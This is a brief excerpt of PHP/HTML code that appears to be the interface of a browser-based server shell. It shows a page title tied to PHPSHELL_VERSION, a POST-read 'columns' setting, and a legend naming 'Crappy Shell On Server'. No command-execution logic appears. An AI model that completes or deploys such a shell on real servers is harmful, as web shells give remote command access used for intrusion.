...
<html>
<head>
  <title>Blah ' . PHPSHELL_VERSION . '</title>
...
$columns  = isset($_POST['columns'])  ? $_POST['columns']  : 40;
...
<fieldset>
  <legend><?php echo "Crappy Shell On Server:" . $_SERVER['SERVER_NAME']; ?></legend>
